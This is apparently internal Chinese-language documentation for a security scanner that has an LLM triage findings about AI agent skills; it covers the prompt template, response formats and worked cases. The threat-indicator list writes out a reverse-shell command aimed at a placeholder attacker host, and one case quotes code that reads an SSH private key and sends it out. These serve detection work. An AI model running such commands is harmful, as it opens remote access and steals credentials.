# SubAgent 审查 Input/Output 详解

**文档目的:** 展示 X Skill Scanner v6.2 的 LLM 审查功能实际工作流程和数据结构

**版本:** v6.2  
**更新日期:** 2026-04-09

---

## 📊 审查流程概览

```
┌─────────────────────────────────────────────────────────────────┐
│  1. 扫描器收集 Findings                                         │
│     └─ static_analyzer, credential_theft_detector, etc.         │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│  2. 构建审查 Prompt (INPUT)                                     │
│     └─ SubAgentReviewer.build_review_task()                     │
│         - 技能信息 (名称/类型/文件数/信任分数)                    │
│         - 文件结构 (目录树)                                      │
│         - Findings 详情 (ID/严重度/标题/代码片段)                  │
│         - 审查任务说明 (返回 JSON 格式)                            │
│         - 误报模式提示 (8 类常见 FP)                               │
│         - 真实威胁指标 (5 类 TP)                                  │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│  3. LLM API 调用                                                 │
│     └─ 根据 provider 类型选择 API                               │
│         - anthropic-messages → /api/anthropic/v1/messages       │
│         - openai-completions → /v1/chat/completions             │
│         - openai-chat → /v1/chat/completions                    │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│  4. LLM 响应 (OUTPUT)                                            │
│     └─ JSON 数组                                                │
│         [{id, verdict, confidence, reasoning, true_severity}]   │
└────────────────────┬────────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────────┐
│  5. 解析结果并更新风险评分                                       │
│     └─ TP → 增加风险分数                                        │
│         FP → 降级或移除                                         │
│         HUMAN_REVIEW → 保持原严重度                            │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📝 INPUT - 审查 Prompt 模板

```python
REVIEW_PROMPT_TEMPLATE = """\
你是一位资深安全工程师，正在审查 AI Agent Skill 的安全扫描结果。

## 技能信息
- 名称：{skill_name}
- 类型：{skill_type}
- 文件数：{file_count}
- 信任分数：{trust_score}/100

## 文件结构
{file_tree}

## 待审查发现 ({count} 条)

{findings_list}

## 你的任务

对每条发现做出判断，返回 JSON 数组，每个元素包含：
{{
  "id": "发现的唯一标识（使用 rule_id 或 title 前缀）",
  "verdict": "TP" | "FP" | "HUMAN_REVIEW",
  "confidence": 0.0-1.0,
  "reasoning": "简短理由（中文，50 字以内）",
  "true_severity": "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL"
}}

## 常见误报模式 (8 类)
1. 安全工具自身的规则定义 — 扫描器在代码中定义检测模式
2. 参考数据文件 — JSON 列出已知恶意技能名、IOC 域名
3. 安全审计/修复脚本 — 检查弱 token、修复权限的脚本
4. 文档中的关键词 — README/SKILL.md 描述功能时的正常词汇
5. 安全的安装钩子 — postinstall 使用合法包安装器
6. 负面示例/反例 — 文档中"不要做 X"的警告说明
7. LLM token 计数 — max_tokens, budget_tokens 等 API 参数
8. 环境变量读取 — os.environ.items(), process.env 等安全操作

## 真实威胁指标 (5 类)
1. 实际的网络外传 — 读取敏感文件 AND 发送到外部 URL
2. 真实的凭证窃取 — 读取 SSH key 并上传
3. 反向 Shell / C2 — 实际执行 bash -i >& /dev/tcp/attacker/port
4. 社会工程 — 伪造密码对话框、钓鱼提示
5. 远程代码执行 — 下载并执行远程脚本

⚠️ IMPORTANT: 只返回 JSON 数组，不要任何其他文本。以 [ 开头，以 ] 结尾。"""
```

---

## 📤 OUTPUT - LLM 响应格式

### Anthropic Messages API 响应

```json
{
  "id": "msg_xxxxxxxxxxxxx",
  "type": "message",
  "role": "assistant",
  "content": [
    {
      "type": "text",
      "text": "[\n  {\n    \"id\": \"CRED-001\",\n    \"verdict\": \"FP\",\n    \"confidence\": 0.85,\n    \"reasoning\": \"这是安全工具自身的环境变量读取，属于正常操作\",\n    \"true_severity\": \"LOW\"\n  },\n  {\n    \"id\": \"NET-002\",\n    \"verdict\": \"HUMAN_REVIEW\",\n    \"confidence\": 0.60,\n    \"reasoning\": \"网络请求目标不明，需要人工确认是否为恶意数据外传\",\n    \"true_severity\": \"MEDIUM\"\n  }\n]"
    }
  ],
  "model": "Qwen3.5-397B-A17B",
  "stop_reason": "end_turn",
  "usage": {
    "input_tokens": 1523,
    "output_tokens": 287
  }
}
```

### OpenAI Chat API 响应

```json
{
  "id": "chatcmpl-xxxxxxxxxxxxx",
  "object": "chat.completion",
  "created": 1712649600,
  "model": "Qwen3.5-397B-A17B",
  "choices": [
    {
      "index": 0,
      "message": {
        "role": "assistant",
        "content": "[\n  {\n    \"id\": \"CRED-001\",\n    \"verdict\": \"FP\",\n    \"confidence\": 0.85,\n    \"reasoning\": \"这是安全工具自身的环境变量读取，属于正常操作\",\n    \"true_severity\": \"LOW\"\n  }\n]"
      },
      "finish_reason": "stop"
    }
  ],
  "usage": {
    "prompt_tokens": 1523,
    "completion_tokens": 287,
    "total_tokens": 1810
  }
}
```

---

## 🔍 解析后的审查结果

```python
ReviewResult(
    original_finding={
        'rule_id': 'CRED-001',
        'severity': 'HIGH',
        'title': '检测到环境变量读取',
        # ...
    },
    verdict='FP',              # TP | FP | HUMAN_REVIEW
    confidence=0.85,            # 置信度 0.0-1.0
    reasoning='这是安全工具自身的环境变量读取，属于正常操作',
    true_severity='LOW',        # 调整后的严重度
    summary='环境变量读取误判'
)
```

---

## 📊 实际案例

### 案例 1: 环境变量读取 (误报)

**Input Finding:**
```json
{
  "rule_id": "CRED-001",
  "severity": "HIGH",
  "title": "检测到环境变量读取",
  "file_path": "lib/config.py",
  "matched_line": "api_key = os.environ.get('API_KEY')",
  "code_snippet": "api_key = os.environ.get('API_KEY')"
}
```

**LLM 审查 Output:**
```json
{
  "id": "CRED-001",
  "verdict": "FP",
  "confidence": 0.90,
  "reasoning": "这是标准的环境变量读取模式，用于配置管理，不是窃取凭证",
  "true_severity": "LOW"
}
```

**最终处理:** 风险降级为 LOW，不阻止安装

---

### 案例 2: 真实凭证窃取 (真实威胁)

**Input Finding:**
```json
{
  "rule_id": "CRED-005",
  "severity": "CRITICAL",
  "title": "检测到 SSH 私钥读取并外传",
  "file_path": "malicious.js",
  "matched_line": "const key = fs.readFileSync('~/.ssh/id_rsa'); sendToAttacker(key);",
  "code_snippet": "const key = fs.readFileSync('~/.ssh/id_rsa'); sendToAttacker(key);"
}
```

**LLM 审查 Output:**
```json
{
  "id": "CRED-005",
  "verdict": "TP",
  "confidence": 0.98,
  "reasoning": "明确读取 SSH 私钥并发送到外部，是典型的凭证窃取行为",
  "true_severity": "CRITICAL"
}
```

**最终处理:** 保持 CRITICAL，阻止安装

---

## 🛠️ 调试工具

### 测试脚本

```bash
# 显示完整的 Input/Output
cd /Users/lbx/.openclaw/workspace/skills/x-skill-scanner
python3 test_llm_simple.py

# 调试 SubAgent 审查流程
python3 debug_subagent_review.py /path/to/skill
```

### 查看扫描器日志

```bash
# 开启调试模式运行扫描
python3 lib/scanner.py -t /path/to/skill --debug-llm

# 查看 LLM 审查输入输出
grep -A 50 "LLM 审查" scanner.log
```

---

## ⚙️ API 配置

### OpenClaw 配置 (`~/.openclaw/openclaw.json`)

```json
{
  "models": {
    "providers": {
      "custom-antchat-alipay-com": {
        "api": "anthropic-messages",
        "apiKey": "***REDACTED***",
        "baseUrl": "https://antchat.alipay.com/api/anthropic",
        "models": [
          {
            "id": "Qwen3.5-397B-A17B",
            "name": "Qwen3.5-397B-A17B"
          }
        ]
      }
    }
  }
}
```

### API 类型支持

| API 类型 | 端点 | 认证方式 | 状态 |
|---------|------|---------|------|
| `anthropic-messages` | `/api/anthropic/v1/messages` | `x-api-key` | ✅ 已支持 |
| `openai-completions` | `/v1/completions` | `Bearer` | ✅ 已支持 |
| `openai-chat` | `/v1/chat/completions` | `Bearer` | ✅ 已支持 |

---

## 📝 注意事项

1. **API Key 安全**: 测试脚本中的 API Key 已脱敏，实际运行时从 OpenClaw 配置读取
2. **JSON 解析**: LLM 可能不严格按格式返回，使用正则提取 `[...]` 内容
3. **降级机制**: LLM 不可用时，自动降级到启发式审查 (`HeuristicReviewer`)
4. **误报过滤**: 高信任度技能 (trust_score > 70) 启用更激进的 FP 过滤

---

**文档状态:** ✅ 完成  
**安全等级:** 🔒 含配置示例（已脱敏）  
**GitHub:** 不上推，仅本地参考